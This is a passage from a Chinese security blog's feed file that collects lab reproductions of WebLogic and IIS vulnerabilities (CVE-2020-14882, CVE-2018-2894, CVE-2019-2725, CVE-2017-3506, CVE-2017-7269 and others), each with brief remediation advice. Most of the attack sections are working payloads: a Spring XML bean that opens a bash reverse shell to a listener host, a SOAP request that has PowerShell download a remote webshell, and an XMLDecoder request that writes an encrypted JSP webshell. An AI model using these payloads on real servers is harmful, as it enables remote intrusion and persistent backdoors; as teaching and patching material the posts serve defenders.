class="line">ion(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/test%27);%22);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it cve202014882_weblogic_1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zlzl0h.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># reverse-bash.xml</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">&lt;constructor-arg&gt;</span><br><span class="line">&lt;list&gt;</span><br><span class="line">&lt;value&gt;/bin/bash&lt;/value&gt;</span><br><span class="line">&lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">&lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.0.182/9999 0&gt;&amp;1]]&gt;&lt;/value&gt;</span><br><span class="line">&lt;/list&gt;</span><br><span class="line">&lt;/constructor-arg&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>nc开启监听端口，访问</p><p>nc -lvnp 9999</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.c</span><br><span class="line">ontext.support.ClassPathXmlApplicationContext(&quot;http://192.168.0.182/reversebash.xml&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zm46x5.png" alt="2"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p>修复建议</p><p>安装官方最新补丁进行升级：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.oracle.com/security-alerts/cpuapr2020.html</span><br></pre></td></tr></table></figure><p>临时措施：</p><p>由于该漏洞的补丁存在被绕过的风险，建议临时关闭后台&#x2F;console&#x2F;console.portal对外访问。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WebLogic CVE-2018-2894文件任意上传</title>
+      <link href="/archives/8cb2dd9e.html"/>
+      <url>/archives/8cb2dd9e.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="WebLogic-CVE-2018-2894文件任意上传"><a href="#WebLogic-CVE-2018-2894文件任意上传" class="headerlink" title="WebLogic CVE-2018-2894文件任意上传"></a>WebLogic CVE-2018-2894文件任意上传</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service<br>Test Page 在 ‘生产模式’ 下默认不开启，所以该漏洞有一定限制。两个页面分别<br>为&#x2F;ws_utc&#x2F;begin.do、&#x2F;ws_utc&#x2F;config.do。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>打开vulhub里的docker环境</p><p>cd &#x2F;vulhub&#x2F;weblogic</p><p>sudo apt install docker-compose 没有可以先安装这个组件</p><p> sudo docker-compose up -d</p><p> <img src="https://pic.888888.al/i/2023/08/15/ziy0x3.png" alt="0"><br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> http://192.168.0.159:7001/console/login/LoginForm.jsp</span><br><span class="line">获取账号和密码</span><br><span class="line">sudo docker-compose logs | grep password</span><br><span class="line">weblogic dojvLfj3</span><br></pre></td></tr></table></figure><br><img src="https://pic.888888.al/i/2023/08/15/zj3kty.png" alt="1"><br>保存 进入开发模式</p><p>开发环境下的测试页有两个，分别为 config.do 和 begin.do</p><p>首先进入 config.do 文件进行设置，将目录设置为 ws_utc 应用的静态文件css目录，访问这个目录是无<br>需权限的，这一点很重要。</p><p>来到这个页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zjhs4y.png" alt="2"></p><p>设置工作目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_intern</span><br><span class="line">al/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p>点击添加后上传一个jsp<br><img src="https://pic.888888.al/i/2023/08/15/zjluzj.png" alt="3"><br>提交之后点击F12审查元素得到jsp上传后的时间戳<br><img src="https://pic.888888.al/i/2023/08/15/zjpscy.png" alt="4"><br>访问路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/ws_utc/css/config/keystore/1631163729917_shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zk3kwh.png" alt="5"><br>这里我们在对 begin.do 未授权访问进行利用。访问<a href="http://192.168.0.159:7001/ws_utc/begin.do%EF%BC%8C%E4%B8%8A">http://192.168.0.159:7001/ws_utc/begin.do，上</a><br>传一个jsp<br><img src="https://pic.888888.al/i/2023/08/15/zk8jrn.png" alt="6"><br>点击提交，这里辉显示一个error不用管它，F12进入网络，然后筛选POST方法，得到一个jsp的路径<br><img src="https://pic.888888.al/i/2023/08/15/zkdygj.png" alt="7"><br>构造得到<a href="http://192.168.0.159:7001/ws_utc/css/upload/RS_Upload_2021-09-09_05-08-33_853/impo">http://192.168.0.159:7001/ws_utc/css/upload/RS_Upload_2021-09-09_05-08-33_853/impo</a><br>rt_file_name_z.jsp，冰蝎连接即可<br><img src="https://pic.888888.al/i/2023/08/15/zkwrj9.png" alt="8"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p><strong>1.升级 设置强口令</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WebLogic T3协议反序列化命令执行漏洞</title>
+      <link href="/archives/b5c3927d.html"/>
+      <url>/archives/b5c3927d.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="WebLogic-T3协议反序列化命令执行漏洞-CVE-2018-2628"><a href="#WebLogic-T3协议反序列化命令执行漏洞-CVE-2018-2628" class="headerlink" title="WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)"></a>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它<br>Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,<br>并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开<br>启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件<br>的远程代码执行攻击</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p><img src="https://pic.888888.al/i/2023/08/15/zhqxhu.png" alt="0"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载poc</span><br><span class="line">git clone https://github.com/jas502n/CVE-2018-2628.git</span><br><span class="line">进入CVE-2018-2628目录执行getshell命令</span><br><span class="line">python CVE-2018-2628-Getshell.py 192.168.0.159 47136 shell.jsp</span><br><span class="line">python CVE-2018-2628-Getshell.py ip port shell.jsp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zhui7g.png" alt="1"><br><img src="https://pic.888888.al/i/2023/08/15/zhyll7.png" alt="2"></p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p>1.及时更新补丁</p><p>2.禁用T3协议</p><p>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>wls-wsat反序列化漏洞(CVE-2019-2725)</title>
+      <link href="/archives/593eaa36.html"/>
+      <url>/archives/593eaa36.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="wls-wsat反序列化漏洞-CVE-2019-2725"><a href="#wls-wsat反序列化漏洞-CVE-2019-2725" class="headerlink" title="wls-wsat反序列化漏洞(CVE-2019-2725)"></a>wls-wsat反序列化漏洞(CVE-2019-2725)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的<br>xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>weblogic 10.x</p><p>weblogic 12.1.3</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>漏洞存在于：_async&#x2F;AsyncResponseService，访问地址可以访问则存在漏洞：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/_async/AsyncResponseService</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zcf26j.png" alt="0"></p><p>使用burpsuite提交poc 下载远程后门到指定目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.0.185:7001</span><br><span class="line">Content-Length: 910</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><br><span class="line">xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;powershell(new-object</span><br><span class="line">System.Net.WebClient).DownloadFile(&#x27;http://192.168.0.182:81/shell.jsp.txt&#x27;,&#x27;serv</span><br><span class="line">ers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</span><br><span class="line">&#x27;)&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><a href="http://192.168.0.185:7001/_async/webshell.jsp">http://192.168.0.185:7001/_async/webshell.jsp</a> 连接后门</p><p><img src="https://pic.888888.al/i/2023/08/15/zcm7dh.png" alt="1"></p><h2 id="4-修复建议"><a href="#4-修复建议" class="headerlink" title="4.修复建议"></a>4.修复建议</h2><p>禁用bea_wls9_async_response组件</p><p>删除wls9_async_response的war包并重启</p><p>禁止访问 &#x2F;_async&#x2F;* 路径</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XMLDecoder反序列化漏洞(CVE-2017-3506)</title>
+      <link href="/archives/f622fe60.html"/>
+      <url>/archives/f622fe60.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="XMLDecoder反序列化漏洞-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞(CVE-2017-3506)"></a>XMLDecoder反序列化漏洞(CVE-2017-3506)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-2017-<br>10271，Oracle官方在2017年10月份发布了该漏洞的补丁，但没有公开漏洞细节，如果企业未及时安装<br>补丁，存在被攻击的风险。对企业服务器发起了大范围远程攻击，对大量企业的服务器造成了严重威<br>胁，受影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>环境weblogic的版本为10.3.6</p><p>访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zgiicr.png" alt="0"></p><p>发送post包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.0.185:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/hAccept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;</span><br><span class="line">Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1228</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.js</span><br><span class="line">p&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U</span><br><span class="line">extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return</span><br><span class="line">super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))</span><br><span class="line">&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher</span><br><span class="line">c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new</span><br><span class="line">U(this.getClass().getClassLoader()).g(c.doFinal(new</span><br><span class="line">sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta</span><br><span class="line">nce().equals(pageContext);&#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>访问网址 密码 rebeyond</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/bea_wls_internal/test.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zgnnol.png" alt="1"></p><h2 id="3-修复方案"><a href="#3-修复方案" class="headerlink" title="3.修复方案"></a>3.修复方案</h2><p>更新到最新版本,打上10271的补丁,对访问wls-wsat的资源进行访问控制 ,或者根据业务所有需求，考虑<br>是否删除WLS-WebServices组件。包含此组件路径为：</p><p>Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wlswsat</p><p>Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;wlswsat.war</p><p>Middleware&#x2F;wlserver_10.3&#x2F;server&#x2F;lib&#x2F;wls-wsat.war</p><p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认<a href="http://weblogic_ip/wls-w">http://weblogic_ip/wls-w</a><br>sat&#x2F; 是否为404页面。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Weblogic弱口令getshell漏洞</title>
+      <link href="/archives/c1b8f454.html"/>
+      <url>/archives/c1b8f454.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="weblogic-弱口令getshell漏洞"><a href="#weblogic-弱口令getshell漏洞" class="headerlink" title="weblogic 弱口令getshell漏洞"></a>weblogic 弱口令getshell漏洞</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>在weblogic搭建好之后没有修改进入后台的密码 导致弱口令登录获得webshell</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>访问 登录页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/console/login/LoginForm.jsp</span><br></pre></td></tr></table></figure><p>使用默认密码进行登录，如果登录不上使用字段进行穷举 weblogic常用弱口令： <a href="http://cirt.net/passw">http://cirt.net/passw</a><br>ords?criteria&#x3D;weblogic</p><p>错误密码5次之后就会自动锁定，这里使用weblogic&#x2F;Oracle@123登陆后台<br><img src="https://pic.888888.al/i/2023/08/15/zdjgv6.png" alt="0"></p><p>登录后台后 点击部署 点击安装 点击上传文件<br><img src="https://pic.888888.al/i/2023/08/15/ze88pg.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf aaa.war .</span><br></pre></td></tr></table></figure><p>打包后门war文件 上传即可<br><img src="https://pic.888888.al/i/2023/08/15/zee8x3.png" alt="2"></p><p>点击下一步<br><img src="https://pic.888888.al/i/2023/08/15/zes3z3.png" alt="3"></p><p>点击下一步<br><img src="https://pic.888888.al/i/2023/08/15/zewad4.png" alt="4"></p><p>点击完成 来到这个页面<br><img src="https://pic.888888.al/i/2023/08/15/zf0ir8.png" alt="5"></p><p>访问网站网址即可获取webshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/z/shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zfgkmx.png" alt="6"></p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p><strong>1.设置强口令</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS7文件解析漏洞</title>
+      <link href="/archives/5f0a23e4.html"/>
+      <url>/archives/5f0a23e4.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg&#x2F;png后面加上&#x2F;.php，会将a001.jpg&#x2F;png<br>解析为php文件</p><h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><p>上传图片到网站允许目录 在图片上加上&#x2F;.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.148:8980/1.jpg/.php</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/yz8sa6.png" alt="0"></p><h2 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h2><p>1.配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p><p>2.编辑映射模块-&gt;映射-&gt;打勾<br><img src="https://pic.888888.al/i/2023/08/15/yzds66.png" alt="1"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS RCE-CVE-2017-7269</title>
+      <link href="/archives/812b5b48.html"/>
+      <url>/archives/812b5b48.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的<br>ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 <strong>If:&lt;http:&#x2F;&#x2F;</strong> 开头的长标头执行任<br>意代码 PROPFIND请求</p><h2 id="2-影响范围"><a href="#2-影响范围" class="headerlink" title="2.影响范围"></a>2.影响范围</h2><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p><h2 id="3-复现"><a href="#3-复现" class="headerlink" title="3.复现"></a>3.复现</h2><p>POC地址:<a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">115</span> <span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">154</span> <span class="number">9999</span></span><br><span class="line">nc -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z0ncd5.png" alt="0"></p><h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h2><p><strong>1.关闭 WebDav服务</strong></p><p><strong>2.升级</strong></p><p><strong>3.部署安全设备</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS短文件名漏洞</title>
+      <link href="/archives/c8c55640.html"/>
+      <url>/archives/c8c55640.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>简介：Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位<br>Windows的程序访问这些文件。在cmd下输入”dir &#x2F;x”即可看到短文件名的效果。<br><img src="https://pic.888888.al/i/2023/08/15/z2ycfo.png" alt="0"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p><p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六<br>种<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>提醒一下 IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;&#x3D;8.0版本,即使没有安装ASP.NET，通过<br>OPTIONS和TRACE方法也可以猜解成功。以下通过开启IIS6.0 ASP.NET后进行复现<br><img src="https://pic.888888.al/i/2023/08/15/z34ssl.png" alt="1"></p><p><strong>短文件名特征：</strong><br>1.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的<br>6个字符是相同的,后面的数字进行递增<br><img src="https://pic.888888.al/i/2023/08/15/z3jy2l.png" alt="2"></p><p>2.后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断。<br><img src="https://pic.888888.al/i/2023/08/15/z43vmq.png" alt="3"></p><p>3.所有小写字母均转换成大写的字母</p><p>4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<br><img src="https://pic.888888.al/i/2023/08/15/z48fch.png" alt="4"></p><p>5.长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包<br>含空格或者其他部分特殊字符,不论长度均会生成短文件。<br><img src="https://pic.888888.al/i/2023/08/15/z4mx6e.png" alt="5"><br>.</p><p>.</p><p>使用payload验证目标是否存在IIS短文件名漏洞,下图显示的404,说明目标存在该短文件名<br>注：* 可以匹配n个字符, n可以为0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><strong>通过浏览器访问一个存在的短文件名，会返回404状态码, 404说明该文件存在</strong><br><img src="https://pic.888888.al/i/2023/08/15/z5hs0g.png" alt="6"><br><strong>通过浏览器访问一个不存在的短文件名，会返回400状态码, 400说明该文件不存在</strong><br><img src="https://pic.888888.al/i/2023/08/15/z4utmy.png" alt="7"></p><p>通过浏览器访问上面两个payload,根据返回的结果,可以说明目标存在IIS短文件漏洞</p><p>判断漏洞存在后,接下来手工详细分析猜解IIS短文件名</p><p>在网站目录下新建一个 abcde1231111.txt文件,分别访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/a*~1*/a.aspx</span><br><span class="line"></span><br><span class="line">http://upload.moonteam.com/b*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z6ghu4.png" alt="8"><br><img src="https://pic.888888.al/i/2023/08/15/z6k1hb.png" alt="9"><br>通过两次的提交确认了a是404 b是400 所以存在a文件开头的短文件。</p><p>通过上面的方法接着往后猜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 